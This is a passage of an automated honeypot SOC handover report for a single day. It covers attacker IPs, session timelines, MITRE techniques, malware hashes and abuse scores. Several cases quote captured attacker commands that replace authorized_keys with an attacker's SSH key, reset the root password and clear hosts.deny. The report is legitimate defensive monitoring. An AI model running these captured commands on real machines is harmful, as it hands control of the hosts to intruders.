| `2026-04-19 12:33:27` | `cowrie.session.connect` |
| `2026-04-19 12:33:27` | `cowrie.client.version` |
| `2026-04-19 12:33:27` | `cowrie.client.kex` |
| `2026-04-19 12:33:28` | `cowrie.login.success` |
| `2026-04-19 12:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.108[.]102` to AbuseIPDB if not already reported
- [ ] Block `14.103.108[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6346aa51638

| Field | Detail |
|---|---|
| **Source IP** | `14.103.108[.]102` |
| **First Seen** | 2026-04-19 12:39 |
| **Last Seen** | 2026-04-19 12:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 12:39:41` | `cowrie.session.connect` |
| `2026-04-19 12:39:41` | `cowrie.client.version` |
| `2026-04-19 12:39:42` | `cowrie.client.kex` |
| `2026-04-19 12:39:42` | `cowrie.login.success` |
| `2026-04-19 12:39:42` | `cowrie.session.params` |
| `2026-04-19 12:39:42` | `cowrie.command.input` |
| `2026-04-19 12:39:42` | `cowrie.command.failed` |
| `2026-04-19 12:39:42` | `cowrie.log.closed` |
| `2026-04-19 12:39:43` | `cowrie.session.params` |
| `2026-04-19 12:39:43` | `cowrie.command.input` |
| `2026-04-19 12:39:43` | `cowrie.session.file_download` |
| `2026-04-19 12:39:43` | `cowrie.log.closed` |
| `2026-04-19 12:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.108[.]102` to AbuseIPDB if not already reported
- [ ] Block `14.103.108[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4db5d69b8891

| Field | Detail |
|---|---|
| **Source IP** | `14.103.108[.]102` |
| **First Seen** | 2026-04-19 12:39 |
| **Last Seen** | 2026-04-19 12:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 12:39:50` | `cowrie.session.connect` |
| `2026-04-19 12:39:50` | `cowrie.client.version` |
| `2026-04-19 12:39:50` | `cowrie.client.kex` |
| `2026-04-19 12:39:51` | `cowrie.login.success` |
| `2026-04-19 12:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.108[.]102` to AbuseIPDB if not already reported
- [ ] Block `14.103.108[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31ea1b0e9bde

| Field | Detail |
|---|---|
| **Source IP** | `118.122.147[.]195` |
| **First Seen** | 2026-04-19 13:01 |
| **Last Seen** | 2026-04-19 13:01 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ZLS8Z1NKq656"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:01:31` | `cowrie.session.connect` |
| `2026-04-19 13:01:31` | `cowrie.client.version` |
| `2026-04-19 13:01:32` | `cowrie.client.kex` |
| `2026-04-19 13:01:32` | `cowrie.login.success` |
| `2026-04-19 13:01:33` | `cowrie.session.params` |
| `2026-04-19 13:01:33` | `cowrie.command.input` |
| `2026-04-19 13:01:33` | `cowrie.command.failed` |
| `2026-04-19 13:01:33` | `cowrie.log.closed` |
| `2026-04-19 13:01:33` | `cowrie.session.params` |
| `2026-04-19 13:01:33` | `cowrie.command.input` |
| `2026-04-19 13:01:33` | `cowrie.session.file_download` |
| `2026-04-19 13:01:33` | `cowrie.log.closed` |
| `2026-04-19 13:01:50` | `cowrie.session.params` |
| `2026-04-19 13:01:50` | `cowrie.command.input` |
| `2026-04-19 13:01:50` | `cowrie.log.closed` |
| `2026-04-19 13:01:50` | `cowrie.session.params` |
| `2026-04-19 13:01:50` | `cowrie.command.input` |
| `2026-04-19 13:01:50` | `cowrie.log.closed` |
| `2026-04-19 13:01:51` | `cowrie.session.params` |
| `2026-04-19 13:01:51` | `cowrie.command.input` |
| `2026-04-19 13:01:51` | `cowrie.session.file_download` |
| `2026-04-19 13:01:51` | `cowrie.log.closed` |
| `2026-04-19 13:01:52` | `cowrie.session.params` |
| `2026-04-19 13:01:52` | `cowrie.command.input` |
| `2026-04-19 13:01:52` | `cowrie.log.closed` |
| `2026-04-19 13:01:52` | `cowrie.session.params` |
| `2026-04-19 13:01:52` | `cowrie.command.input` |
| `2026-04-19 13:01:52` | `cowrie.log.closed` |
| `2026-04-19 13:01:53` | `cowrie.session.params` |
| `2026-04-19 13:01:53` | `cowrie.command.input` |
| `2026-04-19 13:01:53` | `cowrie.command.input` |
| `2026-04-19 13:01:53` | `cowrie.log.closed` |
| `2026-04-19 13:01:53` | `cowrie.session.params` |
| `2026-04-19 13:01:53` | `cowrie.command.input` |
| `2026-04-19 13:01:54` | `cowrie.log.closed` |
| `2026-04-19 13:01:54` | `cowrie.session.params` |
| `2026-04-19 13:01:54` | `cowrie.command.input` |
| `2026-04-19 13:01:54` | `cowrie.log.closed` |
| `2026-04-19 13:01:55` | `cowrie.session.params` |
| `2026-04-19 13:01:55` | `cowrie.command.input` |
| `2026-04-19 13:01:55` | `cowrie.log.closed` |
| `2026-04-19 13:01:55` | `cowrie.session.params` |
| `2026-04-19 13:01:55` | `cowrie.command.input` |
| `2026-04-19 13:01:55` | `cowrie.log.closed` |
| `2026-04-19 13:01:56` | `cowrie.session.params` |
| `2026-04-19 13:01:56` | `cowrie.command.input` |
| `2026-04-19 13:01:56` | `cowrie.log.closed` |
| `2026-04-19 13:01:56` | `cowrie.session.params` |
| `2026-04-19 13:01:56` | `cowrie.command.input` |
| `2026-04-19 13:01:57` | `cowrie.log.closed` |
| `2026-04-19 13:01:57` | `cowrie.session.params` |
| `2026-04-19 13:01:57` | `cowrie.command.input` |
| `2026-04-19 13:01:57` | `cowrie.log.closed` |
| `2026-04-19 13:01:58` | `cowrie.session.params` |
| `2026-04-19 13:01:58` | `cowrie.command.input` |
| `2026-04-19 13:01:58` | `cowrie.log.closed` |
| `2026-04-19 13:01:58` | `cowrie.session.params` |
| `2026-04-19 13:01:58` | `cowrie.command.input` |
| `2026-04-19 13:01:58` | `cowrie.log.closed` |
| `2026-04-19 13:01:59` | `cowrie.session.params` |
| `2026-04-19 13:01:59` | `cowrie.command.input` |
| `2026-04-19 13:01:59` | `cowrie.log.closed` |
| `2026-04-19 13:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.147[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.122.147[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09f69a4e139a

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-04-19 13:01 |
| **Last Seen** | 2026-04-19 13:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:01:59` | `cowrie.session.connect` |
| `2026-04-19 13:01:59` | `cowrie.client.version` |
| `2026-04-19 13:01:59` | `cowrie.client.kex` |
| `2026-04-19 13:02:01` | `cowrie.login.success` |
| `2026-04-19 13:02:01` | `cowrie.session.params` |
| `2026-04-19 13:02:01` | `cowrie.command.input` |
| `2026-04-19 13:02:01` | `cowrie.command.failed` |
| `2026-04-19 13:02:02` | `cowrie.log.closed` |
| `2026-04-19 13:02:02` | `cowrie.session.params` |
| `2026-04-19 13:02:02` | `cowrie.command.input` |
| `2026-04-19 13:02:03` | `cowrie.session.file_download` |
| `2026-04-19 13:02:03` | `cowrie.log.closed` |
| `2026-04-19 13:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bcc99ad56e7

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-04-19 13:02 |
| **Last Seen** | 2026-04-19 13:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:02:07` | `cowrie.session.connect` |
| `2026-04-19 13:02:07` | `cowrie.client.version` |
| `2026-04-19 13:02:07` | `cowrie.client.kex` |
| `2026-04-19 13:02:08` | `cowrie.login.success` |
| `2026-04-19 13:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccaa0b509c5b

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-04-19 13:03 |
| **Last Seen** | 2026-04-19 13:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:03:36` | `cowrie.session.connect` |
| `2026-04-19 13:03:36` | `cowrie.client.version` |
| `2026-04-19 13:03:36` | `cowrie.client.kex` |
| `2026-04-19 13:03:37` | `cowrie.login.success` |
| `2026-04-19 13:03:37` | `cowrie.session.params` |
| `2026-04-19 13:03:37` | `cowrie.command.input` |
| `2026-04-19 13:03:37` | `cowrie.command.failed` |
| `2026-04-19 13:03:37` | `cowrie.log.closed` |
| `2026-04-19 13:03:37` | `cowrie.session.params` |
| `2026-04-19 13:03:37` | `cowrie.command.input` |
| `2026-04-19 13:03:37` | `cowrie.session.file_download` |
| `2026-04-19 13:03:37` | `cowrie.log.closed` |
| `2026-04-19 13:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cb47be9228d

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-04-19 13:03 |
| **Last Seen** | 2026-04-19 13:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:03:38` | `cowrie.session.connect` |
| `2026-04-19 13:03:38` | `cowrie.client.version` |
| `2026-04-19 13:03:38` | `cowrie.client.kex` |
| `2026-04-19 13:03:38` | `cowrie.login.success` |
| `2026-04-19 13:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.103.108[.]102` | **25** | 2026-04-19 12:26 | 2026-04-19 12:44 | 40m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `69.5.20[.]232` | **22** | 2026-04-19 10:43 | 2026-04-19 11:28 | 0m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `211.105.129[.]57` | **20** | 2026-04-19 10:43 | 2026-04-19 11:14 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `123.48.142[.]249` | **19** | 2026-04-19 10:44 | 2026-04-19 11:16 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `123.235.91[.]95` | **11** | 2026-04-19 12:40 | 2026-04-19 12:43 | 5m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.130.168[.]2` | **6** | 2026-04-19 10:56 | 2026-04-19 11:04 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `14.103.120[.]147` | **3** | 2026-04-19 10:44 | 2026-04-19 10:55 | 4m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.122.147[.]195` | **2** | 2026-04-19 13:01 | 2026-04-19 13:03 | 4m | 0 | `T1592` | 🟢 LOW |
| `180.76.115[.]202` | **2** | 2026-04-19 12:28 | 2026-04-19 12:30 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.182[.]13` | 1 | 2026-04-19 12:24 | 2026-04-19 12:24 | 28s | 0 | `T1592` | 🟢 LOW |
| `122.176.122[.]24` | 1 | 2026-04-19 13:03 | 2026-04-19 13:03 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `123.248.124[.]56` | 1 | 2026-04-19 12:31 | 2026-04-19 12:32 | 30s | 0 | `T1592` | 🟢 LOW |
| `159.65.219[.]252` | 1 | 2026-04-19 12:34 | 2026-04-19 12:34 | 2s | 0 | `T1592` | 🟢 LOW |
| `180.76.172[.]156` | 1 | 2026-04-19 11:43 | 2026-04-19 11:45 | 93s | 1 | `T1110.001` | 🟢 LOW |
| `201.76.120[.]30` | 1 | 2026-04-19 13:02 | 2026-04-19 13:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `54.227.93[.]52` | 1 | 2026-04-19 12:55 | 2026-04-19 12:55 | 1s | 0 | `T1592` | 🟢 LOW |
| `89.190.156[.]34` | 1 | 2026-04-19 12:10 | 2026-04-19 12:10 | 18s | 0 | `T1592` | 🟢 LOW |
| `94.156.14[.]80` | 1 | 2026-04-19 11:13 | 2026-04-19 11:13 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `123.235.91[.]95` | CN | China Unicom Shandong Province Network | **100** ⚠️ | 2 |
| `54.227.93[.]52` | US | Amazon Technologies Inc. | **100** ⚠️ | 21 |
| `211.105.129[.]57` | KR | Korea Telecom | **100** ⚠️ | 41 |
| `159.65.219[.]252` | US | DigitalOcean, LLC | **100** ⚠️ | 23 |
| `69.5.20[.]232` | ID | BYTEPLUS | **100** ⚠️ | 0 |
| `94.156.14[.]80` | RO | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 7 |
| `89.190.156[.]34` | NL | Alsycon B.V. | VPS - Dedicated Servers - Colocation | **100** ⚠️ | 50 |
| `122.176.122[.]24` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 50 |
| `201.76.120[.]30` | BR | VERO S.A | **100** ⚠️ | 50 |
| `180.76.172[.]156` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 159 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 80 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 50 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 26 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 26 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 175 cases |
| Tool 34  | Credential Extractor        | ✅ 134 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (3.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 50 priority case(s) shown individually · 18 recon entry/entries in table (9 group(s) consolidating 110 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-19T13:10:03Z_
